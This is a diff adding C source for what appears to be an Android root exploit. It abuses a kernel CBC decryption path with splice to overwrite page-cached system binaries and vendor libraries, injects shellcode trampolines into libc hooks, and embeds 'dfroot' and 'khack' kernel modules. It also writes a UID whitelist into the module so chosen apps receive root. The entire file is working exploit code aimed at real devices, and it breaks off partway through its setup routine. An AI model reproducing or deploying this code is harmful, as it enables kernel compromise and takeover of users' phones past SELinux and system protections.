@@ -1,0 +1,1070 @@
+#include <stdio.h>
+#include <stdarg.h>
+#include <time.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sched.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/uio.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/utsname.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include "aes256.h"
+
+#define eos(s) (s + strlen(s))
+
+static const char *kCrashDump = "/apex/com.android.runtime/bin/crash_dump64";
+static char    *libcxx_ko_target;
+
+static int      g_encap_port;
+static int      g_sender_port;
+static uint32_t g_spi;
+static uint8_t  g_aes_key[32];
+static uint32_t g_seq = 1;
+static const char *g_probe_file;
+static int g_stage1;
+static int g_bridge_read;
+static int g_init_hook;
+static int g_full;
+static int g_android_release;
+static const char *g_ko_target_override;
+static int g_force_patch;
+
+/* khack1.c keeps its whitelist in "static int allow_uids[8] = {-1,...}",
+ * i.e. 32 bytes of 0xff inside .data.  That run is unique in the module, so
+ * the manager can fill it in without parsing the symbol table. */
+#define ALLOW_UIDS_OFF 0x3d0
+#define ALLOW_UIDS_MAX 8
+
+static int load_uids(unsigned int *out, int max)
+{
+    const char *paths[] = {
+        "/data/data/com.system.uitest/files/uids.txt",
+        "/data/data/com.system.uitest/files/whitelist.txt",
+    };
+    int i, n = 0;
+
+    for (i = 0; i < 2 && !n; i++) {
+        FILE *fp = fopen(paths[i], "r");
+        char line[128];
+
+        if (!fp) continue;
+        while (n < max && fgets(line, sizeof(line), fp)) {
+            char *p = line;
+            long v;
+
+            while (*p == ' ' || *p == '\t') p++;
+            if (*p < '0' || *p > '9') continue;
+            v = strtol(p, NULL, 10);
+            if (v > 0) out[n++] = (unsigned int)v;
+        }
+        fclose(fp);
+    }
+    return n;
+}
+
+/* The module bytes are written into the target file's page cache.  Those pages
+ * stay dirty for the life of the boot, so a second run stacks a new payload on
+ * top of the old one and the chain stops working until a reboot.  Keep the
+ * original bytes and put them back in cleanup(). */
+#define SAVE_MAX 16384
+static char   g_ko_orig[SAVE_MAX];
+static size_t g_ko_len;
+static int    g_ko_saved;
+static char   g_cd_orig[SAVE_MAX];
+static size_t g_cd_len;
+static int    g_cd_saved;
+
+static void save_region(const char *path, char *dst, size_t *len, int *flag)
+{
+    int fd = open(path, O_RDONLY);
+    ssize_t n;
+
+    if (fd < 0) return;
+    n = read(fd, dst, SAVE_MAX);
+    close(fd);
+    if (n <= 0) return;
+    *len = ((size_t)n + 15) & ~(size_t)15;      /* patch_file_cbc wants 16B */
+    *flag = 1;
+}
+static int g_kodump;
+struct PatchRestore {
+    const char *lib;
+    uint64_t    tramp_aligned;
+    uint8_t     tramp_orig[16];
+    uint64_t    shell_off;
+    uint32_t    shell_padded;
+    char        shell_orig[1024];
+    int         valid;
+};
+
+static struct PatchRestore g_libcxx_r;
+static struct PatchRestore g_libc_r;
+
+/* IV = AES256_ECB_DEC(key, old_content) XOR desired
+ * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
+ *   = AES_DEC(key, old_content) XOR IV
+ *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
+ *   = desired
+ */
+static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
+    uint8_t dec[16];
+    aes256_ecb_decrypt(g_aes_key, old_content, dec);
+    for (int i = 0; i < 16; i++)
+        iv[i] = dec[i] ^ desired[i];
+}
+
+/* vfork + exec crash_dump64 (splicehelper); dup2 write_fd onto target_fd in child.
+ * Pass mode="r" for read, NULL for write-splice.
+ * Returns waitpid status, or -1 if clone fails (already logged).
+ */
+static int spawn_crash_dump(off_t offset, int write_fd, int target_fd, const char *mode)
+{
+    char offstr[24];
+    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
+    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
+    if (pid == 0) {
+        if (write_fd != target_fd && dup2(write_fd, target_fd) < 0) _exit(1);
+        if (mode)
+            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, mode, NULL);
+        else
+            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
+        _exit(1);
+    }
+    int st = 0;
+    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+    return st;
+}
+
+/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
+ */
+static int read_vendor_content(off_t offset, uint8_t buf[16]) {
+    int rdpipe[2];
+    if (pipe(rdpipe) < 0) { printf("pipe failed: %s\n", strerror(errno)); return -1; }
+
+    int status = spawn_crash_dump(offset, rdpipe[1], 0, "r");
+    close(rdpipe[1]);
+    int n = 0;
+    if (status >= 0 && WIFEXITED(status) && WEXITSTATUS(status) == 0)
+        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
+    close(rdpipe[0]);
+    if (status < 0) return -1;
+    if (n != 16) {
+        if (WIFEXITED(status)) {
+            static const char *const exit_meanings[] = {
+                [0] = "success",
+                [1] = "open vendor file failed or read returned < 16 bytes",
+                [2] = "write to pipe returned < 16 bytes",
+                [3] = "OUT_FD is not a pipe (fd sanitized by SELinux domain transition?)",
+            };
+            int ec = WEXITSTATUS(status);
+            const char *meaning = (ec < 4) ? exit_meanings[ec] : "unknown";
+            printf("read_vendor at 0x%lx got %d bytes: %s\n",
+                     (long)offset, n, meaning);
+        } else if (WIFSIGNALED(status))
+            printf("read_vendor at 0x%lx got %d bytes: signal %d\n",
+                     (long)offset, n, WTERMSIG(status));
+        else
+            printf("read_vendor at 0x%lx got %d bytes: status 0x%x\n",
+                     (long)offset, n, status);
+        return -1;
+    }
+    return 0;
+}
+
+/* Send one CBC write.
+ * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
+ * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
+ * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
+ * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
+ */
+static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
+                            const uint8_t iv[16], int use_helper) {
+    uint8_t hdr[24];
+    *(uint32_t *)(hdr + 0) = htonl(g_spi);
+    *(uint32_t *)(hdr + 4) = htonl(g_seq++);
+    memcpy(hdr + 8, iv, 16);
+
+    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
+    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
+        printf("vmsplice hdr failed: %s\n", strerror(errno)); return -1;
+    }
+
+    if (use_helper) {
+        int st = spawn_crash_dump(offset, pipe_wr, 1, NULL);
+        if (st < 0) return -1;
+        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
+            printf("splice helper failed status=0x%x\n", st);
+            return -1;
+        }
+    } else {
+        off_t off = offset;
+        if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
+            printf("splice file failed: %s\n", strerror(errno)); return -1;
+        }
+    }
+
+    ssize_t s = splice(pipe_rd, NULL, sk_send, NULL, 40, 0);
+    if (s != 40) { printf("splice pipe->udp: %zd expected 40\n", s); return -1; }
+    return 0;
+}
+
+/* Patch len bytes of payload into file starting at file offset foff.
+ * Writes in 16-byte CBC blocks.
+ * For system files (use_helper=0): reads old_content with pread().
+ * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
+ * len must be a multiple of 16.
+ */
+static int patch_file_cbc(const char *path, const char *payload, size_t len,
+                           size_t foff, int use_helper) {
+    if (len % 16 != 0) {
+        printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
+        return -1;
+    }
+
+    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sk_send < 0) { printf("socket failed: %s\n", strerror(errno)); return -1; }
+    int opt = 1;
+    setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    struct sockaddr_in src = {
+        .sin_family = AF_INET,
+        .sin_port   = htons((uint16_t)g_sender_port),
+        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+    };
+    if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
+        printf("bind port %d failed: %s\n", g_sender_port, strerror(errno));
+    struct sockaddr_in dst = {
+        .sin_family = AF_INET,
+        .sin_port   = htons((uint16_t)g_encap_port),
+        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+    };
+    if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
+        printf("connect failed: %s\n", strerror(errno));
+        close(sk_send); return -1;
+    }
+
+    int file_fd = -1;
+    if (!use_helper) {
+        file_fd = open(path, O_RDONLY);
+        if (file_fd < 0) {
+            printf("open %s failed: %s\n", path, strerror(errno));
+            close(sk_send); return -1;
+        }
+    }
+
+    int pfd[2];
+    if (pipe(pfd) < 0) {
+        printf("pipe failed: %s\n", strerror(errno));
+        if (!use_helper) close(file_fd);
+        close(sk_send);
+        return -1;
+    }
+
+    int rc = 0;
+    for (size_t i = 0; i < len / 16; i++) {
+        off_t off = (off_t)(foff + i * 16);
+        uint8_t old_content[16] = {0};
+
+        if (use_helper) {
+            if (read_vendor_content(off, old_content) < 0) {
+                rc = -1; break;
+            }
+        } else {
+            if (pread(file_fd, old_content, 16, off) != 16) {
+                printf("pread at 0x%lx failed: %s\n", (long)off, strerror(errno));
+                rc = -1; break;
+            }
+        }
+
+        uint8_t desired[16] = {0};
+        memcpy(desired, payload + i * 16, 16);
+
+        uint8_t iv[16];
+        compute_iv(old_content, desired, iv);
+
+        if (do_one_write_cbc(pfd[0], pfd[1], sk_send, file_fd, off, iv, use_helper) < 0) {
+            printf("write #%zu at 0x%lx failed\n", i, (long)off);
+            rc = -1; break;
+        }
+    }
+
+    close(pfd[0]); close(pfd[1]);
+    if (!use_helper) close(file_fd);
+    close(sk_send);
+    if (rc == 0) printf("patched %zu bytes to %s+0x%zx\n", len, path, foff);
+    return rc;
+}
+
+/* ---- KO and splicehelper blobs ---- */
+
+extern char libcxx_start[];
+extern char libcxx_data[];
+extern uint32_t libcxx_len;
+extern char libcxx_first_inst_copy[];
+extern uint32_t libcxx_ko_target_off;
+
+/* second payload: hooks libc.so's __libc_init so the insmod process itself
+ * calls finit_module() and exits with the errno */
+extern char libc2_start[];
+extern char libc2_data[];
+extern uint32_t libc2_len;
+extern char libc2_first_inst_copy[];
+extern uint32_t libc2_ko_target_off;
+
+asm(
+    ".section .rodata\n"
+    ".global dfroot_ko_12_5_10_start\n.global dfroot_ko_12_5_10_end\n"
+    "dfroot_ko_12_5_10_start:\n.incbin \"ko/dfroot-android12-5.10.ko\"\ndfroot_ko_12_5_10_end:\n"
+    ".global dfroot_ko_13_5_10_start\n.global dfroot_ko_13_5_10_end\n"
+    "dfroot_ko_13_5_10_start:\n.incbin \"ko/dfroot-android13-5.10.ko\"\ndfroot_ko_13_5_10_end:\n"
+    ".global dfroot_ko_13_5_15_start\n.global dfroot_ko_13_5_15_end\n"
+    "dfroot_ko_13_5_15_start:\n.incbin \"ko/dfroot-android13-5.15.ko\"\ndfroot_ko_13_5_15_end:\n"
+    ".global dfroot_ko_14_5_15_start\n.global dfroot_ko_14_5_15_end\n"
+    "dfroot_ko_14_5_15_start:\n.incbin \"ko/dfroot-android14-5.15.ko\"\ndfroot_ko_14_5_15_end:\n"
+    ".global dfroot_ko_14_6_1_start\n.global dfroot_ko_14_6_1_end\n"
+    "dfroot_ko_14_6_1_start:\n.incbin \"ko/dfroot-android14-6.1.ko\"\ndfroot_ko_14_6_1_end:\n"
+    ".global dfroot_ko_15_6_6_start\n.global dfroot_ko_15_6_6_end\n"
+    "dfroot_ko_15_6_6_start:\n.incbin \"ko/dfroot-android15-6.6.ko\"\ndfroot_ko_15_6_6_end:\n"
+    ".global dfroot_ko_16_6_12_start\n.global dfroot_ko_16_6_12_end\n"
+    "dfroot_ko_16_6_12_start:\n.incbin \"ko/dfroot-android16-6.12.ko\"\ndfroot_ko_16_6_12_end:\n"
+    ".global dfroot_ko_17_6_18_start\n.global dfroot_ko_17_6_18_end\n"
+    "dfroot_ko_17_6_18_start:\n.incbin \"ko/dfroot-android17-6.18.ko\"\ndfroot_ko_17_6_18_end:\n"
+);
+
+asm(
+    ".section .rodata\n"
+    ".global khack_ko_start\n.global khack_ko_end\n"
+    "khack_ko_start:\n.incbin \"ko/khack-4.19.113.ko\"\nkhack_ko_end:\n"
+);
+
+asm(
+    ".section .rodata\n"
+    ".global splice_helper_start\n.global splice_helper_end\n"
+    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
+);
+
+/* static aarch64 ELF that calls finit_module() and exits with the errno; it is
+ * written over /vendor/bin/toybox_vendor so the kernel runs our code in the
+ * vendor_modprobe domain (the only exec type that domain may use). */
+asm(
+    ".section .rodata\n"
+    ".global prober_start\n.global prober_end\n"
+    "prober_start:\n.incbin \"prober\"\nprober_end:\n"
+);
+
+extern char dfroot_ko_12_5_10_start[], dfroot_ko_12_5_10_end[];
+extern char dfroot_ko_13_5_10_start[], dfroot_ko_13_5_10_end[];
+extern char dfroot_ko_13_5_15_start[], dfroot_ko_13_5_15_end[];
+extern char dfroot_ko_14_5_15_start[], dfroot_ko_14_5_15_end[];
+extern char dfroot_ko_14_6_1_start[],  dfroot_ko_14_6_1_end[];
+extern char dfroot_ko_15_6_6_start[],  dfroot_ko_15_6_6_end[];
+extern char dfroot_ko_16_6_12_start[], dfroot_ko_16_6_12_end[];
+extern char dfroot_ko_17_6_18_start[], dfroot_ko_17_6_18_end[];
+extern char splice_helper_start[], splice_helper_end[];
+extern char prober_start[], prober_end[];
+extern char khack_ko_start[], khack_ko_end[];
+
+struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };
+
+static const struct KoImage *select_ko_image(int andr, int major, int minor) {
+    static const struct KoImage imgs[] = {
+        {12, 5, 10, dfroot_ko_12_5_10_start, dfroot_ko_12_5_10_end},
+        {13, 5, 10, dfroot_ko_13_5_10_start, dfroot_ko_13_5_10_end},
+        {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
+        {14, 5, 15, dfroot_ko_14_5_15_start, dfroot_ko_14_5_15_end},
+        {14, 6,  1, dfroot_ko_14_6_1_start,  dfroot_ko_14_6_1_end},
+        {15, 6,  6, dfroot_ko_15_6_6_start,  dfroot_ko_15_6_6_end},
+        {16, 6, 12, dfroot_ko_16_6_12_start, dfroot_ko_16_6_12_end},
+        {17, 6, 18, dfroot_ko_17_6_18_start, dfroot_ko_17_6_18_end},
+        {11, 4, 19, khack_ko_start, khack_ko_end},
+    };
+    const struct KoImage *fb = NULL;
+    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
+        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
+        if (imgs[i].android_release == andr) return &imgs[i];
+        if (!fb) fb = &imgs[i];
+    }
+    return fb;
+}
+
+static int read_device_versions(int *andr, int *major, int *minor) {
+    struct utsname u;
+    if (uname(&u) != 0) return -1;
+    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
+    /* The Java layer passes Build.VERSION.RELEASE; getprop from a native
+     * popen() is unreliable on OEM builds (empty output here on MIUI 11). */
+    if (g_android_release > 0) { *andr = g_android_release; return 0; }
+    const char *m = strstr(u.release, "android");
+    if (!m) {
+        /* Some vendor kernels drop the "androidNN" token from uname -r, which
+         * leaves nothing to parse here. ro.vendor.build.version.release carries
+         * the same number, so fall back to it - but the popen is untrusted: it
+         * can fail outright, and the property is neither guaranteed numeric nor
+         * short, so nothing is built until a leading integer has actually been
+         * read out of it. */
+        printf("uname -r is missing Android version, trying getprop\n");
+        char vendor_ver[16] = { 0 };
+        FILE *f = popen("getprop ro.vendor.build.version.release", "r");
+        if (f) {
+            if (!fgets(vendor_ver, sizeof(vendor_ver), f))
+                vendor_ver[0] = '\0';
+            pclose(f);
+        }
+        int prop = 0;
+        if (sscanf(vendor_ver, "%d", &prop) != 1 || prop <= 0) {
+            /* Non-GKI vendor kernels (this lmi build) drop both the androidNN
+             * token and the property in some domains. 4.19 on this tree only
+             * ever shipped Android 11, so use that instead of failing the run
+             * after crash_dump64 has already been patched. */
+            printf("getprop returned no usable Android version, assuming 11\n");
+            *andr = 11;
+            return 0;
+        }
+        *andr = prop;
+        return 0;
+    }
+    *andr = atoi(m + strlen("android"));
+    return (*andr > 0) ? 0 : -1;
+}
+
+/* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
+static char *pad16(const char *data, size_t len, size_t *out_len) {
+    size_t padded = (len + 15) & ~(size_t)15;
+    char *buf = calloc(1, padded);
+    if (buf) memcpy(buf, data, len);
+    *out_len = padded;
+    return buf;
+}
+
+/* Write splicehelper into crash_dump64 page cache. */
+static int patch_helper(void) {
+    size_t len;
+    char *buf = pad16(splice_helper_start,
+                      (size_t)(splice_helper_end - splice_helper_start), &len);
+    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
+    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
+    if (!g_cd_saved)
+        save_region(kCrashDump, g_cd_orig, &g_cd_len, &g_cd_saved);
+
+    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
+    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
+
+    uint8_t verify[16];
+    int vfd = open(kCrashDump, O_RDONLY);
+    if (vfd >= 0) {
+        ssize_t n = pread(vfd, verify, 16, 16);
+        close(vfd);
+        if (n == 16 && memcmp(verify, buf + 16, 16) != 0) {
+            printf("patch: crash_dump64 verification failed\n");
+            printf("patch: DEVICE NOT VULNERABLE\n");
+            free(buf);
+            return -1;
+        }
+    }
+    free(buf);
+    return 0;
+}
+
+static int patch_ko(void) {
+    int andr = 0, major = 0, minor = 0;
+    if (read_device_versions(&andr, &major, &minor) != 0) {
+        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
+    }
+    const struct KoImage *ko = select_ko_image(andr, major, minor);
+    if (!ko) {
+        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
+    }
+    printf("Using KMI: android%d-%d.%d\n",
+             ko->android_release, ko->kver_major, ko->kver_minor);
+
+    size_t len;
+    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
+    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
+    {
+        int has_array = 1, k;
+
+        if (ALLOW_UIDS_OFF + ALLOW_UIDS_MAX * 4 > (int)len)
+            has_array = 0;
+        for (k = 0; has_array && k < ALLOW_UIDS_MAX * 4; k++)
+            if ((unsigned char)buf[ALLOW_UIDS_OFF + k] != 0xFF)
+                has_array = 0;
+
+        if (has_array) {
+            unsigned int uids[ALLOW_UIDS_MAX];
+            int n = load_uids(uids, ALLOW_UIDS_MAX), i;
+
+            /* always grant the shell-side uids we actually work from */
+            {
+                static const unsigned int extra[] = { 2000, 10279 };
+                unsigned int e;
+                for (e = 0; e < sizeof(extra)/sizeof(extra[0]) && n < ALLOW_UIDS_MAX; e++) {
+                    int j, seen2 = 0;
+                    for (j = 0; j < n; j++) if (uids[j] == extra[e]) seen2 = 1;
+                    if (!seen2) uids[n++] = extra[e];
+                }
+            }
+
+            /* never lock ourselves out: the file may be stale */
+            if (n < ALLOW_UIDS_MAX) {
+                unsigned int me = (unsigned int)getuid();
+                int seen = 0;
+                for (i = 0; i < n; i++) if (uids[i] == me) seen = 1;
+                if (!seen) uids[n++] = me;
+            }
+            for (i = 0; i < n; i++)
+                memcpy(buf + ALLOW_UIDS_OFF + i * 4, &uids[i], 4);
+            printf("allow_uids: %d entries -> %08x %08x %08x %08x (off=0x%x)\n",
+                   n, n > 0 ? uids[0] : 0, n > 1 ? uids[1] : 0,
+                   n > 2 ? uids[2] : 0, n > 3 ? uids[3] : 0, ALLOW_UIDS_OFF);
+        } else {
+            printf("allow_uids: skipped (off=0x%x bytes=%02x%02x%02x%02x want=ffffffff len=%zu)\n",
+                   ALLOW_UIDS_OFF,
+                   (unsigned char)buf[ALLOW_UIDS_OFF],
+                   (unsigned char)buf[ALLOW_UIDS_OFF+1],
+                   (unsigned char)buf[ALLOW_UIDS_OFF+2],
+                   (unsigned char)buf[ALLOW_UIDS_OFF+3], len);
+        }
+    }
+    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
+    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
+    if (!ret) {
+        unsigned char chk[8] = {0};
+        int vfd = open(libcxx_ko_target, O_RDONLY);
+        if (vfd >= 0) {
+            if (pread(vfd, chk, 8, ALLOW_UIDS_OFF) == 8)
+                printf("verify: on-disk@0x%x = %02x%02x%02x%02x %02x%02x%02x%02x\n",
+                       ALLOW_UIDS_OFF, chk[0],chk[1],chk[2],chk[3],chk[4],chk[5],chk[6],chk[7]);
+            else
+                printf("verify: pread failed\n");
+            close(vfd);
+        }
+    }
+    free(buf);
+    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
+    return ret;
+}
+
+static void restore_one(struct PatchRestore *r) {
+    if (!r->valid) return;
+    printf("restoring trampoline in %s\n", r->lib);
+    patch_file_cbc(r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0);
+    printf("restoring shellcode in %s\n", r->lib);
+    patch_file_cbc(r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0);
+    r->valid = 0;
+}
+
+static void cleanup(void) {
+    if (!g_libcxx_r.valid && !g_libc_r.valid && !g_ko_saved && !g_cd_saved)
+        return;
+    printf("\n=== cleanup ===\n");
+    restore_one(&g_libc_r);
+    restore_one(&g_libcxx_r);
+    if (g_ko_saved) {
+        printf("restoring %s\n", libcxx_ko_target);
+        patch_file_cbc(libcxx_ko_target, g_ko_orig, g_ko_len, 0, 1);
+        g_ko_saved = 0;
+    }
+    if (g_cd_saved) {
+        printf("restoring %s\n", kCrashDump);
+        patch_file_cbc(kCrashDump, g_cd_orig, g_cd_len, 0, 0);
+        g_cd_saved = 0;
+    }
+}
+
+int find_hook_target(const char *lib, const char *sym,
+                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
+                     size_t shellcode_size);
+
+static int patch_hook(const char *lib, const char *sym,
+                      char *stage_data, uint32_t stage_len, char *stage_start,
+                      char *first_inst_copy, struct PatchRestore *restore) {
+    const uint32_t BRANCH = 0x14000000;
+    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
+
+    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
+    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }
+
+    if (padded > sizeof(restore->shell_orig)) {
+        printf("shellcode too large to save (%zu)\n", padded);
+        free(buf); return -1;
+    }
+
+    uint64_t hook_off, shell_off; uint32_t first_insn;
+    printf("Finding symbol offsets for %s:\n", lib);
+    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
+        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
+    }
+    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
+
+    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+
+    if (first_insn == hook_insn) {
+        /* Already patched. The branch we see is ours, so the real first
+         * instruction has to come from the blob we wrote last time (it stores
+         * a copy of it). Without this, re-patching would record the branch as
+         * "original" and the hook would jump back into its own trampoline --
+         * init then aborts and the phone reboots. */
+        uint32_t saved = 0;
+        int f = open(lib, O_RDONLY);
+        if (f >= 0) {
+            off_t o = (off_t)(shell_off + (uint64_t)(first_inst_copy - stage_data));
+            if (pread(f, &saved, 4, o) != 4) saved = 0;
+            close(f);
+        }
+        /* A sane ARM64 instruction is not another B/BL (top 6 bits 0b000101). */
+        if (!saved || (saved >> 26) == 0x05 || (saved >> 26) == 0x25) {
+            printf("%s already patched, cannot recover the original instruction "
+                   "(0x%08x); reboot to clear the page cache\n", lib, saved);
+            free(buf);
+            return -1;
+        }
+        printf("%s already patched; reusing original instruction 0x%08x\n", lib, saved);
+        first_insn = saved;
+    }
+    uint32_t jmpback = BRANCH |
+        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+    *(uint32_t *)&buf[stage_len - 4] = jmpback;
+    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
+
+    uint64_t aligned = hook_off & ~(uint64_t)15;
+    int fd = open(lib, O_RDONLY);
+    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
+    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
+          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
+    close(fd);
+    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }
+
+    restore->lib           = lib;
+    restore->shell_off     = shell_off;
+    restore->shell_padded  = (uint32_t)padded;
+    restore->tramp_aligned = aligned;
+    restore->valid         = 1;
+
+    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
+    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
+    free(buf);
+    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
+
+    int pos = (int)(hook_off & 15);
+    uint8_t blk[16];
+    memcpy(blk, restore->tramp_orig, 16);
+    memcpy(&blk[pos], &hook_insn, 4);
+    printf("patch: %s <- trampoline (16 bytes)\n", lib);
+    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
+    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
+    return ret2;
+}
+
+static int createOrphanProcess(void) {
+    printf("Triggering hook...\n");
+    int pid = fork();
+    if (pid < 0) { printf("Failed to create orphan: %s\n", strerror(errno)); return -1; }
+    if (pid == 0) {
+        int pid2 = fork();
+        if (pid2 == 0) { sleep(1); _exit(0); }
+        _exit(0);
+    }
+    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
+    return 0;
+}
+
+static const char *detect_ko_target(void) {
+    static const char *const candidates[] = {
+        "/vendor/lib64/libbinderdebug.so",
+        "/vendor/lib64/libstagefrighthw.so",
+        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+    };
+    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
+        if (access(candidates[i], F_OK) == 0)
+            return candidates[i];
+    }
+    return candidates[0];
+}
+
+static const char *detect_crash_dump(void) {
+    static const char *const candidates[] = {
+        "/apex/com.android.runtime/bin/crash_dump64",
+        "/system/bin/crash_dump64",
+    };
+    for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
+        if (access(candidates[i], X_OK) == 0)
+            return candidates[i];
+    }
+    return candidates[0];
+}
+
+static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
+    if (strlen(hex) != len * 2) return -1;
+    for (size_t i = 0; i < len; i++) {
+        unsigned int b;
+        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
+        out[i] = (uint8_t)b;
+    }
+    return 0;
+}
+
+static void usage(const char *argv0) {
+    fprintf(stderr,
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
+}
+
+static int setup(int argc, char **argv) {
+    int encap_port = 0, sender_port = 0;
+    uint32_t spi = 0;
+    uint8_t aes_key[32];
+    int have_aes = 0;
+
+    for (int i = 1; i < argc; i++) {
+        const char *a = argv[i];
+        if (!strcmp(a, "--encap-port") && i + 1 < argc)
+            encap_port = atoi(argv[++i]);
+        else if (!strcmp(a, "--sender-port") && i + 1 < argc)
+            sender_port = atoi(argv[++i]);
+        else if (!strcmp(a, "--spi") && i + 1 < argc)
+            spi = (uint32_t)strtoul(argv[++i], NULL, 0);
+        else if (!strcmp(a, "--aes-key") && i + 1 < argc)
+            have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
+        else if (!strcmp(a, "--probe-file") && i + 1 < argc)
+            g_probe_file = argv[++i];
+        else if (!strcmp(a, "--stage1"))
+            g_stage1 = 1;
+        else if (!strcmp(a, "--bridge-read"))
+            g_bridge_read = 1;
+        else if (!strcmp(a, "--init-hook"))
+            g_init_hook = 1;
+        else if (!strcmp(a, "--full"))
+            g_full = 1;
+        else if (!strcmp(a, "--android-release") && i + 1 < argc)
+            g_android_release = atoi(argv[++i]);
+        else if (!strcmp(a, "--ko-target") && i + 1 < argc)
+            g_ko_target_override = argv[++i];
+        else if (!strcmp(a, "--force"))
+            g_force_patch = 1;
+        else if (!strcmp(a, "--kodump"))
+            g_kodump = 1;
+        else { usage(argv[0]); return 2; }
+    }
+    if (!encap_port || !sender_port || !spi || !have_aes) {
+        usage(argv[0]); return 2;
+    }
+
+    g_encap_port  = encap_port;
+    g_sender_port = sender_port;
+    g_spi         = spi;
+    g_seq         = 1;
+    memcpy(g_aes_key, aes_key, 32);
+
+    const char *ko_target = detect_ko_target();
+    libcxx_ko_target = libcxx_data + libcxx_ko_target_off;
+    strncpy(libcxx_ko_target, ko_target, 63);
+    libcxx_ko_target[63] = '\0';
+    if (g_ko_target_override) {
+        strncpy(libcxx_ko_target, g_ko_target_override, 63);
+        libcxx_ko_target[63] = '\0';
+        printf("ko_target override: %s\n", g_ko_target_override);
+    }
+    {
+        char *t2 = libc2_data + libc2_ko_target_off;
+        strncpy(t2, libcxx_ko_target, 63);
+        t2[63] = '\0';
+    }
+
+    printf("=== setup ===\n");
